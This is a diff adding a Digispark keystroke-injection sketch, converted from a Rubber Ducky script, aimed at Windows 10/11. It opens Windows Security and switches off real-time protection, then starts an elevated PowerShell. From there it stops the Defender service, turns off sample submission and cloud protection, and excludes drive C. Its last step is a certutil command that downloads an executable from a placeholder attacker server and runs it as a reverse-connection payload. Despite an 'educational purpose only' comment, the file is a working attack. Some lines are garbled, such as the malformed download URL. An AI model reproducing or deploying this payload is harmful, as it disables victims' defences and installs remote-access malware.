@@ -1,0 +1,79 @@
+// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 
+
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+	DigiKeyboard.sendKeyStroke(0);
+	// Title: windows ducky script
+	// Author: usman
+	// Description: disabling windows real time protection and Defender, reverse payload connection ,then adds an exception of drive C for persistence
+	// Target: Windows 10/11
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	// Open Windows Defender Settings
+	DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.print("windows security");
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	// Navigate to Manage Settings
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(43);
+	DigiKeyboard.delay(100);
+	DigiKeyboard.sendKeyStroke(43);
+	DigiKeyboard.delay(100);
+	DigiKeyboard.sendKeyStroke(43);
+	DigiKeyboard.delay(100);
+	DigiKeyboard.sendKeyStroke(43);
+	DigiKeyboard.delay(100);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	// Open and turn off Realtime Protection
+	DigiKeyboard.sendKeyStroke(44);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	// Exit security settings
+	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	// windows ducky script
+	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(100);
+	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	// to turn off windows firewall
+	DigiKeyboard.print("sc stop WinDefend");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	// To turn off Automatic Sample Submission
+	DigiKeyboard.delay(100);
+	DigiKeyboard.print("Set-MpPreference -SubmitSamplesConsent NeverSend");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	// Disable Cloud-Based Protection
+	DigiKeyboard.delay(100);
+	DigiKeyboard.print("Set-MpPreference -MAPSReporting Disable");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	// Exclude drive C from Defender
+	DigiKeyboard.delay(100);
+	DigiKeyboard.print("Add-MpPreference -ExclusionPath “C:”");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+	//  reverse connection payload
+	// launch the file server and then upload the executable and then insert ip and the port to below command 
+	// This is used for educational purpose only 
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.print("certutil.exe -urlcache -split -f http://[ip] 127.0.0.1:[port] 4444/windows service.exe C:\\Windows\\windows service.exe & C:\\Windows\\windows service.exe");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.print("exit");
+}
